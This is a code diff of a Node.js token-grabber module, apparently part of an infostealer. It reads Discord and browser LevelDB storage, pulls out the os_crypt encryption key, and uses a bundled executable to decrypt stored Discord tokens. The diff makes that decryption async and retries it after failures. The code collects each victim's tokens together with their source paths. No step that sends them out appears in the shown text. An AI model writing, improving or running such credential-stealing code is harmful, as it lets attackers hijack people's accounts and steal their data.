@@ -5,14 +5,25 @@ const { readFileSync, existsSync, readdirSync, writeFileSync, statSync } = requi
 const axios = require('axios');
 const { userAgent } = require('../config');
 const { getTempFolder } = require('../util/init');
+const { sleep } = require('../util/general');
 
 const jsonFile = join(getTempFolder(), 'Discord.json');
 writeFileSync(jsonFile, '{}');
 const tokens = [];
 
-const decryptToken = (token, key) => execSync(
-  join(getTempFolder(), 'decrypt_token.exe') + ' ' + ['--key', `"${key}"`, '--token', `"${token}"`].join(' ')
-).toString('utf8');
+/**
+ * @return Promise<string>
+ */
+const decryptToken = async (token, key) => {
+  try {
+    return (await execSync(
+      join(getTempFolder(), 'decrypt_token.exe') + ' ' + ['--key', `"${key}"`, '--token', `"${token}"`].join(' ')
+    )).toString('utf8');
+  } catch (e) {
+    await sleep(500);
+    await decryptToken(token, key);
+  }
+};
 
 const tokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/gi;
 const encryptedTokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;
@@ -25,7 +36,7 @@ const decryptRickRoll = (path) => {
     const key = JSON.parse(readFileSync(localStatePath).toString())['os_crypt']['encrypted_key'];
     const levelDB = path.includes('cord') ? join(path, 'Local Storage', 'leveldb') : join(path, 'Default', 'Local Storage', 'leveldb');
     if (!existsSync(levelDB)) return;
-    readdirSync(levelDB).map(f => {
+    readdirSync(levelDB).map(async f => {
       if (f.split('.').pop() !== 'log' && f.split('.').pop() !== 'ldb') return;
       const lines = readFileSync(join(levelDB, f), { encoding: 'utf-8', flag: 'r' }).split('\n').map(x => x.trim());
       lines.forEach(line => {
@@ -40,15 +51,15 @@ const decryptRickRoll = (path) => {
           if (!encryptedTokens[token]) encryptedTokens.push(token);
         });
       });
-      encryptedTokens.forEach(token => {
-        token = decryptToken(token, key)?.trim();
+      for (let token of encryptedTokens) {
+        token = (await decryptToken(token, key))?.trim();
         if (
           typeof token === 'string' && token.match(tokenRegex) && !tokens.includes(token)
         ) tokens.push({
           token,
           source: path.replace(process.env.LOCALAPPDATA, '').replace(process.env.APPDATA, '').replace('User Data', '').split('\\').join(' ').trim()
         });
-      });
+      }
       if (tokens.length <= 0) {
         reject();
       } else {
